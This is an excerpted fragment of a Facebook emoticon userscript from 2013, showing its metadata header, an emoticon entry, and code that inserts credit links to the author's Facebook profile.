// ==UserScript==
// @name            Emoji New Emoticon @SyahdanHdt 
// @description     Facebook AutoNew 2013 By Syahdan Hidayatekage
...
"chars" : " :) ",
    ...
    html += '<a class="jewelFooter" href="https://www.facebook.com/syahdanhidayatekage" target="_blank">Created By Syahdan Hidayatekage<br>Subcribe Me</a>';
	html += '</div>';
...
function blub()
{
    if(document.getElementsByClassName('pbm fsm').length == 1) {
        ...
        //e.href = '#';
        e.innerHTML = 'Auto Suggest by Syahdan Hidayatekage';
